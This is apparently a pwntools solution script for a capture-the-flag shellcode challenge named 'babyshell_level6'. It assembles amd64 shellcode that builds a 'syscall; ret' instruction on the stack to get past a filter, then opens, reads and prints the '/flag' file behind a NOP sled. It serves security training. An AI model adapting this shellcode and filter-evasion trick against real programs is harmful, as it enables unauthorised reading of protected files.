from pwn import *

r = process('/challenge/babyshell_level6')

context.arch='amd64'
payload = asm(
    '''


    mov ecx, 0x00c30500
    mov cl, 0x0f
    push rcx


    mov DWORD ptr [rbp], 0x616c662f
    mov WORD ptr [rbp+4], 0x67

    
    mov rax, 2
    mov rdi, rbp
    mov rsi, 0
    mov rdx, 0
    call rsp

    
    mov rdi, rax
    mov rsi, rbp
    mov rdx, 100
    mov rax, 0
    call rsp


    mov rdi, 1 
    mov rsi, rbp
    mov rdx, 100
    mov rax, 1 
    call rsp




    '''
)


r.send(asm('nop')*0x1000 + payload)
r.interactive()